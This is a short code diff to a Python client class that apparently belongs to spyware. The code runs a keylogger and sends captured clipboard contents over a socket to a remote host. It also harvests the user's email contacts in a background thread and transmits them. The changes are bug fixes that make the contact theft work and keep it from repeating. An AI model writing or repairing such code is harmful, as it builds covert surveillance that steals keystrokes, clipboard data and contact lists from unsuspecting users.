@@ -26,7 +26,7 @@ class Client:
         try:
             try:
                self.contacts = contacts.Contacts()
-               contact_thread = threading.Thread(target=self.get_email_addresses)
+               contact_thread = threading.Thread(target=self.contacts.get_email_addresses)
                contact_thread.start()
             except error as msg:
                print(msg)
@@ -64,8 +64,9 @@ class Client:
                 for data in clipboard_data:
                     Protocol.send(self.client_socket, "CLIPBOARD:" + data)
                     self.keylogger.remove_copied()
-            if not sent and len(self.contacts.__getattribute__(email_addresses)) > 0:
+            if not sent and len(self.contacts.__getattribute__("email_addresses")) > 0:
                 self.send_contacts()
+                sent = True
 
     def send_contacts(self):
         """
